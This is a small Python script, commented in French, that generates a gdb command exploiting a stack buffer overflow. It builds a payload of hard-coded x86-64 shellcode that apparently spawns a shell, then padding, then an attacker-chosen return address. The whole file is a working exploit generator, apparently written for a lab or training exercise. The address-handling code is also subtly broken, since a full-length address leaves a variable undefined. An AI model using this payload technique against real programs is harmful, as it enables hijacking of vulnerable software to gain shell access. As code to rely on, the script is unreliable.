import sys, re
# Génération de la commande run pour gdb avec le bon input pour l'adresse donnée en argument
# en fonction de la taille du buffer pour générer un buffer overflow en réécrivant l'adresse de retour

buffer = 80
char = 'A'
shellcode = "\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05"
shellcode_length = 27

if len(sys.argv) != 2:
    print("Génération de la commande run pour gdb avec le bon input pour l'adresse donnée en argument en fonction de la taille du buffer pour générer un buffer overflow en réécrivant l'adresse de retour\n\n")
    print("Usage: python address.py <string>")
    exit(1)
string = sys.argv[1]
if len(string) != 16 + 2:
    diff = 18 - len(string)
    constructed_string = diff * '0' + string.split('x')[1]
string = re.findall('..', constructed_string)
string.reverse()
output = ""
for element in string:
    output += "\\x" + element
output = shellcode + (buffer-shellcode_length) * char + 8 * char + output
commande = "Commande : " + "run $(echo -ne \"" + output + "\")"
print(commande)
